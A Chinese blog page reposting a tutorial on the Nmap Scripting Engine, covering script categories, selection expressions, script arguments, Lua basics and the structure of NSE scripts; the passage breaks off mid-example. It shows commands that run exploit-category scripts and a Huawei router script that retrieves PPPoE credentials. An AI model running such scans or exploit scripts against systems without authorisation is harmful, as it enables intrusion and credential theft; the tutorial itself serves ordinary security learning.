<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="转载 | Nmap渗透测试精通指南"><meta name="keywords" content="工具使用"><meta name="author" content="Mochazz"><meta name="copyright" content="Mochazz"><title>转载 | Nmap渗透测试精通指南 | Mochazz's blog</title><link rel="shortcut icon" href="/favicon.png"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0-1-先行体验"><span class="toc-number">1.</span> <span class="toc-text">0.1 先行体验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#02-深入了解"><span class="toc-number">2.</span> <span class="toc-text">02.深入了解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#脚本分类"><span class="toc-number">2.1.</span> <span class="toc-text">脚本分类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#高级脚本选择与表达式"><span class="toc-number">2.2.</span> <span class="toc-text">高级脚本选择与表达式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NSE脚本参数"><span class="toc-number">2.3.</span> <span class="toc-text">NSE脚本参数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#03-万事具备"><span class="toc-number">3.</span> <span class="toc-text">03.万事具备</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#语言准备"><span class="toc-number">3.1.</span> <span class="toc-text">语言准备</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Lua-特性"><span class="toc-number">3.2.</span> <span class="toc-text">Lua 特性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#了解NSE脚本的编写规则"><span class="toc-number">3.3.</span> <span class="toc-text">了解NSE脚本的编写规则</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Nmap的目录结构"><span class="toc-number">3.3.1.</span> <span class="toc-text">Nmap的目录结构</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#NSE脚本的编写流程"><span class="toc-number">3.3.2.</span> <span class="toc-text">NSE脚本的编写流程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Rule的四种类型"><span class="toc-number">3.3.3.</span> <span class="toc-text">Rule的四种类型</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Postrule"><span class="toc-number">3.4.</span> <span class="toc-text">Postrule</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#后记："><span class="toc-number">3.5.</span> <span class="toc-text">后记：</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.jpg"></div><div class="author-info__name text-center">Mochazz</div><div class="author-info__description text-center">人若无名，方可潜心练剑</div><div class="follow-button"><a href="https://github.com/Mochazz">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">196</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">72</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">20</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="http://www.lmxspace.com">l1nk3r</a><a class="author-info-links__name text-center" href="https://www.virzz.com">Virink</a><a class="author-info-links__name text-center" href="https://www.kingkk.com">kingkk</a><a class="author-info-links__name text-center" href="https://hpdoger.cn">hpdoger</a><a class="author-info-links__name text-center" href="https://www.smi1e.top">smi1e</a><a class="author-info-links__name text-center" href="http://m4p1e.com">maple</a><a class="author-info-links__name text-center" href="https://zhzhdoai.github.io">osword</a><a class="author-info-links__name text-center" href="https://nikoeurus.github.io">Somnus</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/backgroud.jpeg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Mochazz's blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/about">About</a><a class="site-page" href="/read">Read</a></span></div><div id="post-info"><div id="post-title">转载 | Nmap渗透测试精通指南</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-03-28</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/渗透测试/">渗透测试</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>本文转载自红日安全团队：<a href="http://www.sec-redclub.com/archives/841/" target="_blank" rel="noopener">Nmap渗透测试精通指南</a></p>
<p>Nmap脚本引擎（NSE）革新了Nmap的功能。它是在2007年的谷歌夏令营期间推出，虽然第一个脚本是针对服务和主机检测，时至今天，已经存在有14个类别涵盖广泛的任务，从网络发现到检测和利用安全漏洞。既然我们深知NSE的强大，那我们肯定要好好利用它，那么这篇文章我将引导大家走入NSE脚本的世界，时不我待，赶紧跟我一起行动吧。<a id="more"></a></p>
<h3 id="0-1-先行体验"><a href="#0-1-先行体验" class="headerlink" title="0.1 先行体验"></a>0.1 先行体验</h3><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">root</span>@<span class="selector-tag">kali</span>:~# <span class="selector-tag">nmap</span> <span class="selector-tag">-sV</span> <span class="selector-tag">-sC</span> <span class="selector-tag">scanme</span><span class="selector-class">.nmap</span><span class="selector-class">.org</span></span><br></pre></td></tr></table></figure>

<p><img src="http://owv5lapar.bkt.clouddn.com/carbon7.png" alt="carbon"></p>
<p>上一个命令运行带有操作系统检测 (-O)的SYN扫描，即服务检测（-sV），最重要的是NSE在（-sC）上。 -sC选项启用NSE并在默认类别中运行任何脚本。 这组脚本被默认为安全的，它不会执行任何可能会干扰在该服务上运行的服务的目标主机的操作。 但是，某些脚本执行可能引发的操作入侵检测系统（IDS）和入侵防护系统（IPS）中的警报。</p>
<h3 id="02-深入了解"><a href="#02-深入了解" class="headerlink" title="02.深入了解"></a>02.深入了解</h3><h4 id="脚本分类"><a href="#脚本分类" class="headerlink" title="脚本分类"></a>脚本分类</h4><p>首先我们得了解脚本的分类信息，这样我们才能更好地把我们自定义的脚本进行归类利用。</p>
<table>
<thead>
<tr>
<th>脚本类别</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>auth</td>
<td>与用户认证相关的NSE脚本</td>
</tr>
<tr>
<td>broadcast</td>
<td>使用广播收集网络信息</td>
</tr>
<tr>
<td>brute</td>
<td>暴力破解</td>
</tr>
<tr>
<td>default</td>
<td>默认，执行脚本（-sC）</td>
</tr>
<tr>
<td>discovery</td>
<td>与主机和服务发现相关的脚本</td>
</tr>
<tr>
<td>dos</td>
<td>与拒绝服务攻击有关的脚本</td>
</tr>
<tr>
<td>exploit</td>
<td>用于利用安全漏洞的脚本</td>
</tr>
<tr>
<td>external</td>
<td>此类别适用于第三方服务的脚本</td>
</tr>
<tr>
<td>fuzzer</td>
<td>NSE脚本专注于模糊测试</td>
</tr>
<tr>
<td>intrusive</td>
<td>入侵脚本</td>
</tr>
<tr>
<td>malware</td>
<td>与恶意软件检测相关的脚本类别</td>
</tr>
<tr>
<td>safe</td>
<td>在所有情况下默认为是安全的脚本</td>
</tr>
<tr>
<td>vuln</td>
<td>与检测和利用安全漏洞相关的脚本</td>
</tr>
<tr>
<td>version</td>
<td>高级系统脚本</td>
</tr>
</tbody></table>
<p>####NSE脚本选择</p>
<p>Nmap使用 –script选项进行脚本的选择。 这个选项后面可以是一个脚本名称，NSE类别，NSE文件的路径，包含脚本的文件夹,甚至表达式。使用 –script通过脚本名称或类别进行选择脚本。Nmap选项会按名称执行脚本。 执行时用逗号分隔几个脚本：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">直接加脚本名称</span><br><span class="line">nmap --script http-title &lt;target&gt;</span><br><span class="line"></span><br><span class="line">nmap -p80 --script http-huawei-hg5xx-vuln &lt;target&gt;</span><br><span class="line"></span><br><span class="line">nmap --script http-title，http-methods &lt;target&gt;</span><br></pre></td></tr></table></figure>

<p>以下屏幕截图显示了http-huawei-hg5xx-vuln脚本的输出。 此脚本利用华为设备中的远程漏洞进行检索，检索的信息包括PPPoE凭证和无线网络安全配置：</p>
<p><img src="http://owv5lapar.bkt.clouddn.com/carbon5.png" alt="carbon(1)"></p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">要选择整个类别，只需使用类别的名称（请参阅脚本作为参数。 例如，要运行漏洞类别，</span><br><span class="line">使用以下命令：</span><br><span class="line">nmap --script exploit &lt;target&gt;</span><br><span class="line"></span><br><span class="line">您也可以用逗号分隔它们来运行多个类别：</span><br><span class="line"></span><br><span class="line">nmap --script discovery,intrusive &lt;target&gt;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">-sC</span>选项仅仅是<span class="selector-tag">--script</span>默认选项的别名。</span><br><span class="line"></span><br><span class="line">按文件名或文件夹选择</span><br><span class="line"></span><br><span class="line">要执行<span class="selector-tag">NSE</span>脚本文件，请使用以下命令：</span><br><span class="line"></span><br><span class="line">nmap --script /path/to/script.nse &lt;target&gt;</span><br><span class="line"></span><br><span class="line">与类别类似，可以通过分离路径来执行多个脚本</span><br><span class="line"></span><br><span class="line">用逗号分隔：</span><br><span class="line"></span><br><span class="line">nmap --script /path/to/script.nse,/another/path/script2.nse &lt;target&gt;</span><br><span class="line"></span><br><span class="line">要执行文件夹中包含的所有脚本，只需要传递文件夹名称</span><br><span class="line"></span><br><span class="line">举个栗子：</span><br><span class="line"></span><br><span class="line">nmap --script/path/to/folder/ &lt;target&gt;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">--script</span> /<span class="selector-tag">custom-nse-scripts</span>/ <span class="selector-tag">scanme</span><span class="selector-class">.nmap</span><span class="selector-class">.org</span></span><br></pre></td></tr></table></figure>

<h4 id="高级脚本选择与表达式"><a href="#高级脚本选择与表达式" class="headerlink" title="高级脚本选择与表达式"></a>高级脚本选择与表达式</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">表达式用于描述一组脚本。</span><br><span class="line">我们可以利用脚本选择表达式的场景：</span><br><span class="line">•举个栗子:（未利用表达式将匹配任何脚本）</span><br><span class="line"></span><br><span class="line">使用不属于<span class="selector-tag">exploit</span>类别的脚本：</span><br><span class="line">#nmap -sV --script "not exploit" &lt;target&gt;</span><br><span class="line"></span><br><span class="line">•或和运算符允许我们构造更复杂的表达式。</span><br><span class="line">以下表达式将匹配不在<span class="selector-tag">intrusive</span>,或者<span class="selector-tag">dos</span>,或者<span class="selector-tag">exploit</span>类别中的任何脚本。</span><br><span class="line"></span><br><span class="line">#nmap --script "not（intrusive or dos or exploit）" -sV &lt;target&gt;</span><br><span class="line"></span><br><span class="line">•如果我们想要执行<span class="selector-tag">broadcast</span>和<span class="selector-tag">discovery</span>中的所有类别脚本。</span><br><span class="line"></span><br><span class="line">我们使用：</span><br><span class="line"></span><br><span class="line">#nmap --script "broadcast and discovery" &lt; target&gt;</span><br><span class="line"></span><br><span class="line">•甚至可以使用通配符*：</span><br><span class="line"></span><br><span class="line">#nmap --script "snmp- *" &lt;target&gt;</span><br><span class="line"></span><br><span class="line">•当然，我们可以结合使用通配符和表达式。例如:</span><br><span class="line"></span><br><span class="line">让我们运行名称以<span class="selector-tag">http-</span>开头的所有脚本，但排除</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">http-slowloris</span>，<span class="selector-tag">http-brute</span>，<span class="selector-tag">http-form-fuzzer</span>和<span class="selector-tag">http-enum</span>脚本：</span><br><span class="line"></span><br><span class="line">#nmap --script "http-* and not(http-slowloris or http-brute or http-enum or http-form-fuzzer)" &lt;target&gt;</span><br><span class="line"></span><br><span class="line">下一个命令将执行以<span class="selector-tag">http</span>开头的但不在<span class="selector-tag">exploit</span>类别中的所有脚本：</span><br><span class="line">#nmap --script“http- * not（exploit）”&lt;target&gt;</span><br></pre></td></tr></table></figure>

<h4 id="NSE脚本参数"><a href="#NSE脚本参数" class="headerlink" title="NSE脚本参数"></a>NSE脚本参数</h4><p><strong>–script-args</strong> 选项用于在NSE脚本中设置参数。</p>
<p>还是举个栗子，设置http-title脚本的参数useragent，<br>使用这个表达式：</p>
<blockquote>
<p>nmap -sV –script http-title –script-args http.useragent =“Mozilla 1337“<target></target></p>
</blockquote>
<p>当然有时你也可以在忽略脚本名称设置参数(以下两条表达意思是一致的)：</p>
<blockquote>
<p>nmap -p80 –script http-trace –script-args path <target></target></p>
</blockquote>
<blockquote>
<p>nmap -p80 –script http-trace –script-args http-trace.path <target></target></p>
</blockquote>
<p><strong>如果你使用共享参数名称的脚本，就必须避免参数冲突。</strong>例如下面中的uri参数，公用的时候要是需要进行额外的设置时就必须加上完整的脚本名称，避免参数之间的冲突。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ nmap --script http-majordomo2-dir-traversal，http-axis2-dir-traversal</span><br><span class="line"></span><br><span class="line">--script-args http-axis2-dir-traversal.uri = /axis2/，uri =/majordomo/ &lt;target&gt;</span><br><span class="line"></span><br><span class="line">$ nmap --script http-majordomo2-dir-traversal，http-axis2-dir-traversal</span><br><span class="line"></span><br><span class="line">--script-args uri = /axis2/，http-majordomo2-dir-traversal.uri = /majordomo/ &lt;target&gt;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="03-万事具备"><a href="#03-万事具备" class="headerlink" title="03.万事具备"></a>03.万事具备</h3><h4 id="语言准备"><a href="#语言准备" class="headerlink" title="语言准备"></a>语言准备</h4><p>编写NSE脚本我们需要有lua编程语言的基础，可以回去自己学习一下。我这里简单列出编写脚本之前必须了解的一些语法。其他的就自己回去学习吧。转载于菜鸟教程：<a href="http://www.runoob.com/lua/lua-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/lua/lua-tutorial.html</a></p>
<h4 id="Lua-特性"><a href="#Lua-特性" class="headerlink" title="Lua 特性"></a>Lua 特性</h4><ul>
<li><strong>轻量级</strong>: 它用标准C语言编写并以源代码形式开放，编译后仅仅一百余K，可以很方便的嵌入别的程序里。</li>
<li><strong>可扩展</strong>: Lua提供了非常易于使用的扩展接口和机制：由宿主语言(通常是C或C++)提供这些功能，Lua可以使用它们，就像是本来就内置的功能一样。</li>
<li>其它特性<ul>
<li>支持面向过程(procedure-oriented)编程和函数式编程(functional programming)；</li>
<li>自动内存管理；只提供了一种通用类型的表（table），用它可以实现数组，哈希表，集合，对象；</li>
<li>语言内置模式匹配；闭包(closure)；函数也可以看做一个值；提供多线程（协同进程，并非操作系统所支持的线程）支持；</li>
<li>通过闭包和table可以很方便地支持面向对象编程所需要的一些关键机制，比如数据抽象，虚函数，继承和重载等</li>
</ul>
</li>
</ul>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 单行注释</span></span><br><span class="line"><span class="comment">--[[</span></span><br><span class="line"><span class="comment"> 多行注释</span></span><br><span class="line"><span class="comment"> 多行注释</span></span><br><span class="line"><span class="comment"> --]]</span></span><br><span class="line"> </span><br><span class="line">标示符</span><br><span class="line">Lua 标示符用于定义一个变量，函数获取其他用户定义的项。标示符以一个字母 A 到 Z 或 a 到 z 或下划线 _ 开头后加上<span class="number">0</span>个或多个字母，下划线，数字（<span class="number">0</span>到<span class="number">9</span>）。</span><br><span class="line">最好不要使用下划线加大写字母的标示符，因为Lua的保留字也是这样的。</span><br><span class="line">Lua 不允许使用特殊字符如 @, $, 和 % 来定义标示符。 Lua 是一个区分大小写的编程语言。因此在 Lua 中 Runoob 与 runoob 是两个不同的标示符。以下列出了一些正确的标示符：</span><br><span class="line">mohd         zara      abc     move_name    a_123</span><br><span class="line">myname50     _temp     j       a23b9        retVal</span><br><span class="line"></span><br><span class="line">关键词</span><br><span class="line">以下列出了 Lua 的保留关键字。保留关键字不能作为常量或变量或其他用户自定义标示符：</span><br><span class="line"><span class="keyword">and</span>	<span class="keyword">break</span>	<span class="keyword">do</span>	<span class="keyword">else</span></span><br><span class="line"><span class="keyword">elseif</span>	<span class="keyword">end</span>	<span class="literal">false</span>	<span class="keyword">for</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>	<span class="title">if</span>	<span class="title">in</span>	<span class="title">local</span></span></span><br><span class="line"><span class="function"><span class="title">nil</span>	<span class="title">not</span>	<span class="title">or</span>	<span class="title">repeat</span></span></span><br><span class="line"><span class="function"><span class="title">return</span>	<span class="title">then</span>	<span class="title">true</span>	<span class="title">until</span></span></span><br><span class="line"><span class="function"><span class="title">while</span>			</span></span><br><span class="line"><span class="function">一般约定，以下划线开头连接一串大写字母的名字（比如 _VERSION）被保留用于 <span class="title">Lua</span> 内部全局变量</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Lua</span> 数据类型</span></span><br><span class="line"><span class="function"><span class="title">Lua</span>是动态类型语言，变量不要类型定义,只需要为变量赋值。 值可以存储在变量中，作为参数传递或结果返回。</span></span><br><span class="line"><span class="function"><span class="title">Lua</span>中有8个基本类型分别为：<span class="title">nil</span>、<span class="title">boolean</span>、<span class="title">number</span>、<span class="title">string</span>、<span class="title">userdata</span>、<span class="title">function</span>、<span class="title">thread</span>和<span class="title">table</span>。</span></span><br><span class="line"><span class="function">数据类型	描述</span></span><br><span class="line"><span class="function"><span class="title">nil</span>	这个最简单，只有值<span class="title">nil</span>属于该类，表示一个无效值（在条件表达式中相当于<span class="title">false</span>）。</span></span><br><span class="line"><span class="function"><span class="title">boolean</span>	包含两个值：<span class="title">false</span>和<span class="title">true</span>。</span></span><br><span class="line"><span class="function"><span class="title">number</span>	表示双精度类型的实浮点数</span></span><br><span class="line"><span class="function"><span class="title">string</span>	字符串由一对双引号或单引号来表示</span></span><br><span class="line"><span class="function"><span class="title">function</span>	由 <span class="title">C</span> 或 <span class="title">Lua</span> 编写的函数</span></span><br><span class="line"><span class="function"><span class="title">userdata</span>	表示任意存储在变量中的<span class="title">C</span>数据结构</span></span><br><span class="line"><span class="function"><span class="title">thread</span>	表示执行的独立线路，用于执行协同程序</span></span><br><span class="line"><span class="function"><span class="title">table</span>	<span class="title">Lua</span> 中的表（<span class="title">table</span>）其实是一个"关联数组"（<span class="title">associative</span> <span class="title">arrays</span>），数组的索引可以是数字或者是字符串。在 <span class="title">Lua</span> 里，<span class="title">table</span> 的创建是通过"构造表达式"来完成，最简单构造表达式是&#123;&#125;，用来创建一个空表。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">nil</span>（空）</span></span><br><span class="line"><span class="function"><span class="title">nil</span> 类型表示一种没有任何有效值，它只有一个值 <span class="comment">-- nil，例如打印一个没有赋值的变量，便会输出一个 nil 值：</span></span></span><br><span class="line"><span class="function">        </span></span><br><span class="line"><span class="function"><span class="title">Lua</span> 变量</span></span><br><span class="line"><span class="function">变量在使用前，必须在代码中进行声明，即创建该变量。</span></span><br><span class="line"><span class="function">编译程序执行代码之前编译器需要知道如何给语句变量开辟存储区，用于存储变量的值。</span></span><br><span class="line"><span class="function"><span class="title">Lua</span> 变量有三种类型：全局变量、局部变量、表中的域。</span></span><br><span class="line"><span class="function"><span class="title">Lua</span> 中的变量全是全局变量，那怕是语句块或是函数里，除非用 <span class="title">local</span> 显式声明为局部变量。</span></span><br><span class="line"><span class="function">局部变量的作用域为从声明位置开始到所在语句块结束。</span></span><br><span class="line"><span class="function">变量的默认值均为 <span class="title">nil</span>。</span></span><br><span class="line"><span class="function"><span class="comment">-- test.lua 文件脚本</span></span></span><br><span class="line"><span class="function"><span class="title">a</span> = 5               <span class="comment">-- 全局变量</span></span></span><br><span class="line"><span class="function"><span class="title">local</span> <span class="title">b</span> = 5         <span class="comment">-- 局部变量</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">joke</span><span class="params">()</span></span></span><br><span class="line">    c = <span class="number">5</span>           <span class="comment">-- 全局变量</span></span><br><span class="line">    <span class="keyword">local</span> d = <span class="number">6</span>     <span class="comment">-- 局部变量</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">joke()</span><br><span class="line"><span class="built_in">print</span>(c,d)          <span class="comment">--&gt; 5 nil</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> </span><br><span class="line">    <span class="keyword">local</span> a = <span class="number">6</span>     <span class="comment">-- 局部变量</span></span><br><span class="line">    b = <span class="number">6</span>           <span class="comment">-- 全局变量</span></span><br><span class="line">    <span class="built_in">print</span>(a,b);     <span class="comment">--&gt; 6 6</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a,b)      <span class="comment">--&gt; 5 6</span></span><br><span class="line">执行以上实例输出结果为：</span><br><span class="line">$ lua test.lua </span><br><span class="line"><span class="number">5</span>    <span class="literal">nil</span></span><br><span class="line"><span class="number">6</span>    <span class="number">6</span></span><br><span class="line"><span class="number">5</span>    <span class="number">6</span></span><br></pre></td></tr></table></figure>

<hr>
<h4 id="了解NSE脚本的编写规则"><a href="#了解NSE脚本的编写规则" class="headerlink" title="了解NSE脚本的编写规则"></a>了解NSE脚本的编写规则</h4><h5 id="Nmap的目录结构"><a href="#Nmap的目录结构" class="headerlink" title="Nmap的目录结构"></a>Nmap的目录结构</h5><p>我们只需要简单的了解一下它的结构即可，了解它的目录结构是为了清楚Nse脚本存放的位置。这里有几个注意点：</p>
<blockquote>
<p>1.编写的脚本的后缀为nse</p>
<p>2.编写之后的NSE脚本存放在script文件夹内，这样脚本才可以生效</p>
<p>3.必须使用–script选项进行调用Nse脚本</p>
</blockquote>
<p><img src="http://owv5lapar.bkt.clouddn.com/Snipaste_2018-03-21_19-36-59.jpg" alt="Snipaste_2018-03-21_19-36-59"></p>
<h5 id="NSE脚本的编写流程"><a href="#NSE脚本的编写流程" class="headerlink" title="NSE脚本的编写流程"></a>NSE脚本的编写流程</h5><p>在书写NSE脚本之前我们必须了解它的书写步骤，为了方便大家理解，我把一个NSE脚本的书写分为了四步。</p>
<blockquote>
<p>1.导入脚本编写所需库</p>
<p>2.编写脚本描述信息</p>
<p>3.确定Rule类型</p>
<p>4.编写Action</p>
</blockquote>
<p>可能此时你还有点蒙，没关系，我们看一下图思路就清晰了。</p>
<p>Namp nse 脚本模板结构如图所示：</p>
<p><img src="http://owv5lapar.bkt.clouddn.com/Snipaste_2018-03-20_21-27-45.jpg" alt="Snipaste_2018-03-20_21-27-45"></p>
<p>文章看到这里大家肯定想接下来肯定要开始编写NSE脚本了吧。还不行呢，我们先举个几个栗子来说说四个Rule类型的区别。</p>
<h5 id="Rule的四种类型"><a href="#Rule的四种类型" class="headerlink" title="Rule的四种类型"></a>Rule的四种类型</h5><p>Rule：用于描述脚本的触发规则，返回值只有true和false两种。返回值决定了后面action对应的函数是否执行，注意：true(执行),flase(不执行)。它有四种类型分别是Prerule，Hostrule,Portrule,Postrule。</p>
<p>下面的几个栗子的环境为：</p>
<pre><code>1.Window
2.phpstudy
3.nmap-7.6
4.zzcms8.2（对应zzcms.im）</code></pre><p><strong>基础参数扩展</strong></p>
<table>
<thead>
<tr>
<th>host</th>
<th>table类型</th>
</tr>
</thead>
<tbody><tr>
<td>host.os</td>
<td>操作系统信息</td>
</tr>
<tr>
<td>host.ip</td>
<td>tagret(目标主机)对应的ip,例如下面的127.0.0.1</td>
</tr>
<tr>
<td>host.name</td>
<td>tagert在命令行对应的名字，例如下面的zzcms.im</td>
</tr>
<tr>
<td>host.targetname</td>
<td>同上host.name，我个人是这样认为的</td>
</tr>
<tr>
<td>host.directly_connected</td>
<td>判断目标主机是否与本机在同一个子网</td>
</tr>
<tr>
<td>host.mac_addr</td>
<td>mac地址 （必须是同一子网的设备这个命令才有效）</td>
</tr>
<tr>
<td><strong>port</strong></td>
<td><strong>table类型</strong></td>
</tr>
<tr>
<td>port.number</td>
<td>端口号</td>
</tr>
<tr>
<td>port.protocol</td>
<td>协议</td>
</tr>
<tr>
<td>port.service</td>
<td>服务 http或https</td>
</tr>
<tr>
<td>port.version</td>
<td>版本信息</td>
</tr>
<tr>
<td>port.state</td>
<td>端口状态</td>
</tr>
</tbody></table>
<p><strong>Prerule</strong></p>
<p><strong>Prerule会在Namp没有扫描之前进行触发。</strong></p>
<p>举个栗子：我们新建一个prerule.nse文件，然后我们把它存放在script文件夹下。只要”HongRi AnQuan NSE script Prerule test”打印在Namp扫描之前，就可以证明Prerule会在Namp没有扫描之前进行触发。</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- prerule.nse</span></span><br><span class="line">description = <span class="string">[[Prerule test ]]</span></span><br><span class="line"><span class="comment">---</span></span><br><span class="line"><span class="comment">-- 